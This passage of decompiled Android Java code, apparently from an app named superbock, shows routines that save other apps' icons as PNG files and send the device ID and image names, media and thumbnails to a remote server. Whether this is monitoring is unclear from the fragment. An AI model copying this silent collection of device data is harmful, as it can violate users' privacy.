            android.content.pm.ApplicationInfo r4 = r2.getApplicationInfo(r0, r3)     // Catch: java.lang.Throwable -> La4
            android.graphics.drawable.Drawable r2 = r2.getApplicationIcon(r4)     // Catch: java.lang.Throwable -> La4
            if (r2 == 0) goto La4
            boolean r4 = r2 instanceof android.graphics.drawable.ColorDrawable     // Catch: java.lang.Throwable -> La4
            if (r4 == 0) goto L30
            goto La4
        L30:
            int r4 = android.os.Build.VERSION.SDK_INT     // Catch: java.lang.Throwable -> La4
            r5 = 26
            if (r4 < r5) goto L5c
            boolean r4 = r2 instanceof android.graphics.drawable.AdaptiveIconDrawable     // Catch: java.lang.Throwable -> La4
            if (r4 == 0) goto L5c
            int r4 = r2.getIntrinsicWidth()     // Catch: java.lang.Throwable -> La4
            int r5 = r2.getIntrinsicHeight()     // Catch: java.lang.Throwable -> La4
            android.graphics.Bitmap$Config r6 = android.graphics.Bitmap.Config.ARGB_8888     // Catch: java.lang.Throwable -> La4
            android.graphics.Bitmap r4 = android.graphics.Bitmap.createBitmap(r4, r5, r6)     // Catch: java.lang.Throwable -> La4
            android.graphics.Canvas r5 = new android.graphics.Canvas     // Catch: java.lang.Throwable -> La4
            r5.<init>(r4)     // Catch: java.lang.Throwable -> La4
            int r6 = r5.getWidth()     // Catch: java.lang.Throwable -> La4
            int r7 = r5.getHeight()     // Catch: java.lang.Throwable -> La4
            r2.setBounds(r3, r3, r6, r7)     // Catch: java.lang.Throwable -> La4
            r2.draw(r5)     // Catch: java.lang.Throwable -> La4
            goto L62
        L5c:
            android.graphics.drawable.BitmapDrawable r2 = (android.graphics.drawable.BitmapDrawable) r2     // Catch: java.lang.Throwable -> La4
            android.graphics.Bitmap r4 = r2.getBitmap()     // Catch: java.lang.Throwable -> La4
        L62:
            java.io.File r2 = new java.io.File     // Catch: java.lang.Throwable -> La4
            java.lang.StringBuilder r3 = new java.lang.StringBuilder     // Catch: java.lang.Throwable -> La4
            r3.<init>()     // Catch: java.lang.Throwable -> La4
            java.lang.String r5 = "/appicon"
            java.io.File r9 = r9.getExternalFilesDir(r5)     // Catch: java.lang.Throwable -> La4
            r3.append(r9)     // Catch: java.lang.Throwable -> La4
            java.lang.String r9 = "/"
            r3.append(r9)     // Catch: java.lang.Throwable -> La4
            r3.append(r0)     // Catch: java.lang.Throwable -> La4
            java.lang.String r9 = ".png"
            r3.append(r9)     // Catch: java.lang.Throwable -> La4
            java.lang.String r9 = r3.toString()     // Catch: java.lang.Throwable -> La4
            r2.<init>(r9)     // Catch: java.lang.Throwable -> La4
            boolean r9 = r2.exists()     // Catch: java.lang.Throwable -> La4
            if (r9 == 0) goto L8e
        L8c:
            r1 = r2
            goto La4
        L8e:
            r2.createNewFile()     // Catch: java.lang.Throwable -> La4
            java.io.FileOutputStream r9 = new java.io.FileOutputStream     // Catch: java.lang.Throwable -> La4
            r9.<init>(r2)     // Catch: java.lang.Throwable -> La4
            android.graphics.Bitmap$CompressFormat r0 = android.graphics.Bitmap.CompressFormat.PNG     // Catch: java.lang.Throwable -> La4
            r3 = 30
            r4.compress(r0, r3, r9)     // Catch: java.lang.Throwable -> La4
            r9.flush()     // Catch: java.lang.Throwable -> La4
            r9.close()     // Catch: java.lang.Throwable -> La4
            goto L8c
        La4:
            if (r1 != 0) goto Lb7
            int r9 = r8.getCo()
            int r9 = r9 + 1
            r8.setCo(r9)
            g3.a r9 = g3.a.b()     // Catch: java.sql.SQLException -> Lb6
            r9.d(r8)     // Catch: java.sql.SQLException -> Lb6
        Lb6:
            return
        Lb7:
            java.lang.String r9 = k.j0.k()
            k3.f$d r0 = new k3.f$d
            r0.<init>(r8)
            k3.b.b(r9, r1, r0)
        Lc3:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: k3.f.u(com.superbock.bean.AInfo, android.content.Context):void");
    }

    public static void v(EInfo eInfo, Context context) {
        f.e eVar = new f.e();
        eVar.put("action", "saveImages");
        eVar.put("deviceId", k3.a.c(context));
        eVar.put("imagesId", eInfo.getId());
        eVar.put("name", eInfo.getNa());
        eVar.put("modifyDate", Long.valueOf(eInfo.getMo()));
        eVar.put("media", eInfo.getMe());
        eVar.put("thumb", eInfo.getTh());
        k3.i.a(eVar, new a(eInfo, context));
    }
}
